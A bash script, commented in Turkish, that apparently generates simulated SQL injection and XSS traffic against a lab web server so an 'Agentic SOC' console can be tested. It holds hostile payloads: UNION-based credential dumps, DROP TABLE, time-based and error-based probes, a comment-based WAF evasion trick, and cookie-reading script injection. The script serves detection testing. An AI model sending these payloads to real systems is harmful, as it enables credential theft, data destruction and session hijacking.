#!/usr/bin/env bash
# lab/victims/web-sqli-xss/attack.sh
# Web SQL Injection / XSS saldırısını simüle eder.
# Kullanım: bash attack.sh [hedef_ip] [hedef_port] [gecikme]

TARGET_IP="${1:-127.0.0.1}"
TARGET_PORT="${2:-8080}"
DELAY="${3:-0.3}"   # İstekler arası bekleme (saniye)
BASE="http://${TARGET_IP}:${TARGET_PORT}"

# --- SQLi payload'ları -> var olmayan path'ler -> 404 ("engellendi/bulunamadı") ---
# Not: curl, kodlanmamış boşluk içeren URL'leri reddediyor; "/**/" (SQL
# satır-içi yorum) boşluk yerine geçiyor. Bu aynı zamanda gerçek bir
# WAF-atlatma tekniği, yani daha gerçekçi bir payload.
SQLI_404=(
  "/product?id=1'/**/OR/**/'1'='1"
  "/product?id=1/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
  "/item?id=1;DROP/**/TABLE/**/users--"
  "/login?user=admin'--&pass=x"
  "/item?id=1/**/AND/**/SLEEP(5)--"
  "/product?id=1/**/AND/**/1=CONVERT(int,(SELECT/**/TOP/**/1/**/table_name/**/FROM/**/information_schema.tables))--"
  "/product?id=%27%20OR%20%271%27%3D%271"   # yüzde-kodlu varyant
)

# --- XSS payload'ları -> var olmayan path'ler -> 404 ---
XSS_404=(
  "/comment?name=<script>alert(document.cookie)</script>"
  "/feedback?msg=<img/src=x/onerror=alert(1)>"
  "/profile?bio=javascript:alert(1)"
  "/comment?name=%3Cscript%3Ealert(1)%3C/script%3E"   # yüzde-kodlu varyant
)

# --- her tipten biri -> gerçekten var olan bir sayfa (search.html) -> 200 ("başarılı") ---
SUCCESS_HITS=(
  "/search.html?q=1'/**/OR/**/'1'='1"
  "/search.html?q=<script>alert(1)</script>"
)

fire() {
    local path="$1"
    local code
    code=$(curl -s -o /dev/null -w '%{http_code}' "${BASE}${path}")
    printf "[%s] %s%s\n" "$code" "$BASE" "$path"
    sleep "$DELAY"
}

echo "=============================================="
echo "  Agentic SOC – Web SQLi/XSS Simülasyonu"
echo "  Hedef: ${TARGET_IP}:${TARGET_PORT}"
echo "  Gecikme: ${DELAY}s / istek"
echo "=============================================="
echo ""

if ! command -v curl &>/dev/null; then
    echo "[!] curl komutu bulunamadı. Kur: sudo apt-get install -y curl"
    exit 1
fi

echo "[*] SQL Injection denemeleri gönderiliyor..."
for p in "${SQLI_404[@]}"; do fire "$p"; done

echo ""
echo "[*] XSS denemeleri gönderiliyor..."
for p in "${XSS_404[@]}"; do fire "$p"; done

echo ""
echo "[*] Engellenmemiş (200) istekler gönderiliyor..."
for p in "${SUCCESS_HITS[@]}"; do fire "$p"; done

echo ""
echo "=============================================="
echo "  Simülasyon tamamlandı."
echo "  Agentic SOC konsolunu kontrol et!"
echo "=============================================="
